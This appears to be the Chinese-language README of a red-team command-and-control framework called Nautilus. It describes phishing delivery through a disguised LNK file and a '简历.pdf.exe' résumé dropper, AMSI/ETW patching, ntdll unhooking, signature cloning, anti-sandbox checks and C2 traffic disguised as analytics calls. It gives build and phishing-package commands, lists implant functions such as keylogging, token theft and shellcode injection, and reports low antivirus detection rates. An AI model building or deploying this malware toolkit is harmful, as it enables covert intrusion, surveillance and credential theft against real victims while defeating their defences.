# Nautilus C2 — 多链路免杀红队C2框架

> **⚠️ 法律声明：本项目仅供授权安全测试和教育研究使用。未经授权对任何系统使用本工具属于违法行为。使用者须确保在合法授权范围内操作，并遵守当地法律法规。项目作者不对任何非法使用行为承担责任。**

## 命名灵感

**Nautilus**（鹦鹉螺）——深海中的精密工程奇迹。其独特的喷水推进机制隐喻植入体的C2回连通信，精密的螺旋外壳象征多层加密与通信伪装。如同鹦鹉螺在深海中无声航行，Nautilus 植入体在目标网络中静默潜伏，通过远程遥控执行任务。

## 项目概述

Nautilus 是一个从零构建的轻量级红队 C2（Command & Control）框架，采用 Go 语言编写，涵盖服务端、植入体、分阶段加载器三个核心组件。支持 **LNK 链路** 和 **PDF 链路** 两条独立投递通道，均集成完整免杀技术栈。

### 投递链路

| 链路 | 入口 | 流程 | 诱饵 |
|------|------|------|------|
| **LNK** | `challenge.lnk` | LNK → wscript.exe → update.vbs → payload + notepad decoy | CTF_challenge.txt |
| **PDF** | `简历.pdf.exe` | 双击 → 释放 decoy.pdf + 弹出 PDF + C2 连接 | 简历.pdf (内嵌) |

### 架构

```
┌─────────────────────────────────────────────────┐
│  VPS / 攻击者机器                                │
│  ┌───────────────────────────────────────┐      │
│  │  fish-server (:8443)                  │      │
│  │  ├─ Web UI (/ui)                      │      │
│  │  ├─ WebSocket 实时推送                 │      │
│  │  ├─ 认证登录 (HMAC-SHA256)            │      │
│  │  └─ 任务管理 API                       │      │
│  └───────────────────────────────────────┘      │
└─────────────────────────────────────────────────┘
        ↑ AES-GCM加密通信 (伪装为前端埋点API)
        ↓ /api/v1/analytics?id=<encrypted>&sid=<session>
┌─────────────────────────────────────────────────┐
│  目标机器                                        │
│  ┌───────────────┐  ┌───────────────────┐      │
│  │  LNK/PDF 诱饵  │→ │  植入体            │      │
│  │  (用户点击)    │  │  Halo's Gate+回调  │      │
│  └───────────────┘  │  AES-GCM C2通信    │      │
│                     └───────────────────┘      │
└─────────────────────────────────────────────────┘
```

## 免杀技术栈

### 运行时免杀

| 技术 | 实现 | 效果 |
|------|------|------|
| **Halo's Gate (直接syscall)** | PEB遍历获取ntdll基址 → 导出表解析SSN → 检测EDR hook → 推断hooked SSN → SYSCALL指令直接入核 | 绕过所有用户态EDR hook |
| **API Hashing (XOR加密)** | 所有DLL名/API名 XOR 0x7F加密，运行时解密 | 消除IAT静态字符串特征 |
| **AMSI Bypass** | patchMem修改AmsiScanBuffer返回AMSI_RESULT_CLEAN | 绕过AMSI脚本检测 |
| **ETW Bypass** | patchMem修改EtwEventWrite直接返回 | 绕过ETW事件监控 |
| **Ntdll Unhook** | 从磁盘读干净ntdll → 覆盖.text段（通过直接syscall） | 脱掉EDR inline hook |
| **回调执行** | EnumWindows/EnumChildWindows回调执行shellcode | 绕过syscall调用监控 |
| **RW→RX权限翻转** | 先RW分配 → 写入 → 再改RX | 避免RWX页面特征 |
| **Ekko Sleep加密 (P1)** | 休眠期加密模块数据页(.data/.rdata/.bss)，Timer Queue唤醒后解密 | 绕过EDR内存扫描 |
| **功能伪装** | 启动后打开诱饵文件(notepad/PDF) | 转移用户注意力 |
| **反沙箱** | 物理内存/CPU核数/运行时间/用户名/调试器 | 阻止沙箱分析 |
| **Import表稀释** | 额外导入大量合法Win32 API | 降低敏感API密度 |

### 编译期/后处理免杀

| 技术 | 实现 | 效果 |
|------|------|------|
| **Garble -literals** | 编译期字符串加密 | 消除所有Go字符串特征 |
| **Garble -controlflow** | 控制流混淆（block splitting + junk jumps + flattening） | 破坏逆向分析 |
| **Garble -seed=random** | 每次构建不同种子，不同SHA256 | 避免哈希规则匹配 |
| **Pclntab混淆 (P0)** | Go 1.25+ `-pclntab=empty` 移除函数符号表（Go运行时仍然工作） | 消除Go二进制最大特征 |
| **String Zeroing** | 后处理清零敏感字符串（Go build ID、API名等） | 破坏YARA字符串规则 |
| **Rich Header Clear** | 清除Go编译器指纹 | 破坏编译器识别 |
| **PE Timestamp Patch** | 修改PE时间戳 | 破坏基于时间戳的家族分类 |
| **Overlay Data** | 附加32KB随机数据(含ZIP头) | 改变文件哈希 |
| **Legit Signatures** | 添加Microsoft/Windows等合法签名字符串 | 伪装为正常程序 |
| **Authenticode Clone** | 从合法PE克隆PKCS#7签名 | 伪装数字签名 |
| **PDF Icon Embed** | rsrc嵌入PDF图标 | PDF链路伪装 |

### 通信伪装

C2 通信伪装为**前端埋点数据上报**：

```
GET /api/v1/analytics?id=<AES-GCM加密base64>&sid=<sessionID>
Headers: User-Agent=Chrome/125, Accept=application/json, Origin=localhost
```

## 项目结构

```
nautilus/
├── main.go                    # LNK链路植入体入口
├── shellcode_handler_windows.go # 载荷执行处理
├── shellcode_handler_linux.go   # Linux载荷处理(stub)
├── build.ps1                  # 统一构建脚本（含所有免杀选项）
├── phish.ps1                  # LNK钓鱼包生成器
├── scan.ps1                   # 扫描辅助
├── multiscan.ps1              # 多引擎扫描
├── go.mod / go.sum            # Go模块定义
│
├── pdf/                        # PDF链路（独立包）
│   ├── main.go                # PDF植入体入口
│   ├── dropper_windows.go     # 释放+打开decoy.pdf
│   ├── shellcode_handler_*.go # 载荷执行
│   ├── decoy.pdf              # 内嵌诱饵PDF
│   └── rsrc_amd64.syso        # PDF图标资源
│
├── server/                     # C2服务端
│   ├── main.go                # HTTP服务器+WebSocket+控制台
│   ├── ui.go                  # Web UI API
│   └── web/index.html         # 内嵌管理界面
│
├── c2/                         # 通信层
│   ├── encode/packet.go       # 协议编码/解码
│   └── transport/http.go      # HTTP传输（伪装埋点API）
│
├── core/                       # 核心功能
│   ├── exec.go                # 命令执行(cmd+powershell)
│   ├── fs.go                  # 文件操作
│   ├── process.go             # 进程管理
│   ├── privilege.go           # 权限信息
│   ├── sysinfo.go             # 系统信息采集
│   └── shellcode_windows.go   # Shellcode加载(回调+RW→RX)
│
├── evasion/                    # 运行时免杀
│   ├── ssn_resolve_windows.go # Halo's Gate SSN解析
│   ├── syscall_amd64.s        # 直接SYSCALL汇编stub
│   ├── direct_syscall_windows.go # 直接syscall Go包装
│   ├── apiresolve_windows.go  # XOR加密API动态解析
│   ├── edr_bypass_windows.go  # AMSI+ETW bypass
│   ├── unhook_windows.go      # Ntdll unhook from disk
│   ├── legitimate_apis_windows.go # Import表稀释
│   ├── sleep_obfuscation_windows.go # Sleep XOR加密(旧)
│   ├── sleep_ekko_windows.go   # Ekko Sleep加密(P1新)
│   ├── crypto.go              # AES-GCM + Base64
│   ├── sandbox.go             # 反沙箱检测
│   └── pe.go                  # PE结构操作
│
├── evasion-tools/              # 后处理工具
│   ├── pepatch.go              # PE时间戳修改
│   ├── pesectionobf.go        # PE section名混淆
│   ├── postprocess.go          # 字符串清零+Rich Header+合法签名
│   ├── sigclone.go             # Authenticode签名克隆
│   ├── genico.go               # ICO图标生成
│   └── rsrcinject.go           # 资源注入
│
├── stager/                     # 分阶段加载器
│   └── main_windows.go         # XOR下载+内存执行
│
└── icons/                      # 图标资源
    ├── pdf.ico                 # PDF图标
    └── doc.ico                 # 文档图标
```

### LNK链路免杀 (v4)

| 改动 | 说明 | 规避的检测 |
|------|------|------------|
| TargetPath=`wscript.exe` | 替代 cmd.exe 作为LNK目标 | 消除 cmd.exe YARA 规则 |
| Arguments=Base64 VBS | `update.vbs` 启动 payload + 诱饵 | 消除 .bat 字符串规则 |
| 目录名 `assets\data` | 替代 `__MACOSX\.note` | 消除 __MACOSX YARA 规则 |
| ExpString 欺骗 | 显示 `notepad.exe` 文件名 | CVE-2025-9491 欺骗 |
| Zone.Identifier 清除 | 删除 NTFS alternate data stream | 消除 Elastic 下载检测 |
| WindowStyle=1 | 替代最小化窗口 | 消除最小化 LNK YARA 规则 |

### 沙箱检测结果

| 链路 | 平台 | 得分 | 检出签名 | 结果 |
|------|------|------|----------|------|
| **PDF链路** (`简历.pdf.exe`) | 微步云沙箱 (Win10 1903) | 0.8/10 | 1个: `getsysteminfo` (severity=1) | ✅ 极低风险 |
| **LNK链路** (`challenge.lnk`) | 微步云沙箱 (Win10 1903) | 1.0/10 | 1个: `getsysteminfo` (severity=1) | ✅ 极低风险 |

> 唯一条目为最低级别的"获取系统信息"签名，正常程序均可能触发，非恶意指标。

## 使用说明

### 构建（所有免杀功能）

```powershell
# LNK链路 + 全免杀
.\build.ps1 -Garble -ControlFlow -EnableStringZero -C2Addr "https://YOUR_VPS:8443"

# PDF链路 + 全免杀
.\build.ps1 -Chain pdf -PdfName 简历 -Garble -ControlFlow -EnableStringZero -C2Addr "https://YOUR_VPS:8443"

# Authenticode签名克隆（可选）
.\build.ps1 -Garble -ControlFlow -EnableStringZero -SignSource "C:\signed_program.exe"
```

### 构建选项

| 参数 | 说明 |
|------|------|
| `-C2Addr` | C2服务器地址 (默认 `https://192.168.1.1:8443`) |
| `-Garble` | 启用 garble 编译混淆 |
| `-ControlFlow` | 启用控制流混淆 (需要 `-Garble`) |
| `-EnableStringZero` | 启用敏感字符串清零（安全级，不影响调试） |
| `-DeepStringZero` | 启用深度清零（发布级，清零Go runtime内部字符串，输出fish_release.exe） |
| `-SignSource <path>` | Authenticode签名克隆源文件 |
| `-Chain pdf` | 使用PDF链路 (默认lnk) |
| `-PdfName <name>` | PDF链路文件名 (默认report) |
| `-Console` | 启用控制台窗口(调试用) |
| `-SkipPost` | 跳过后处理 |

### 生成LNK钓鱼包

```powershell
.\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF_challenge.txt" -IconType txt -OutputName challenge
```

| 参数 | 说明 |
|------|------|
| `-ExePath` | 植入体exe路径 |
| `-DecoyName` | 诱饵文件名 |
| `-IconType` | 图标类型 (txt/pdf/doc/xls/folder) |
| `-OutputName` | 输出LNK名称 |
| `-KeepWorking` | 保留工作目录(调试用) |

### 启动

```powershell
# VPS上启动服务端
.\fish-server.exe :8443

# 浏览器访问Web UI
http://YOUR_VPS:8443/ui

# 服务端控制台命令
sessions          # 列出所有会话
use <session_id>  # 选择活跃会话
exec <command>    # 执行cmd命令
ps <command>      # 执行PowerShell命令
sysinfo           # 获取系统信息
listdir <path>    # 列出目录
proclist          # 列出进程
kill <pid>        # 终止进程
exit              # 退出
```

## 功能列表

| 功能 | 命令类型 | 说明 |
|------|----------|------|
| CMD执行 | exec | cmd /c 执行命令 |
| PowerShell执行 | ps | powershell -enc 执行 |
| 文件读取 | fileread | 读取文件(Base64返回) |
| 文件写入 | filewrite | 写入文件(Base64输入) |
| 文件删除 | filedelete | 删除文件 |
| 目录列表 | listdir | 列出目录内容 |
| 进程列表 | proclist | 列出所有进程 |
| 进程终止 | prockill | 终止指定PID |
| 权限信息 | privinfo | 获取当前权限 |
| 系统信息 | sysinfo | 系统详情(主机名/IP/OS等) |
| 载荷执行 | payload | 远程shellcode执行 |
| 进程注入 | inject | 注入shellcode到目标进程 |
| 截屏 | screenshot | 捕获桌面截图(PNG) |
| 键盘记录 | keylogon/off | 启动/停止按键捕获 |
| Token枚举 | tokens | 列出所有进程Token信息 |
| Token窃取 | steal-token | 窃取目标进程Token并模拟 |
| Token恢复 | rev2self | 恢复原始进程身份 |
| Token伪造 | make-token | 用凭据创建新Token |

### VirusTotal 检测结果

| 构建配置 | 检出率 | 说明 |
|---------|--------|------|
| 后处理(无Garble) | 11/72 | BitDefender族(7 OEM) + ClamAV/Sliver |
| Garble(-literals) + 后处理 | 5/70 | ClamAV + CrowdStrike + Elastic + Malwarebytes + Symantec |
| **Garble + 后处理 + 深度清零(发布版)** | **4/70** | Bkav Pro + ClamAV/Sliver + Malwarebytes + Symantec |

> CrowdStrike 和 Elastic 在深度清零版中消失。Microsoft Defender、Kaspersky、ESET、Sophos 等大厂 EDR **全部通过**。

## GitHub

仓库地址: https://github.com/nk7667/Nautilus

## 许可证

MIT License — 详见 [LICENSE](LICENSE)
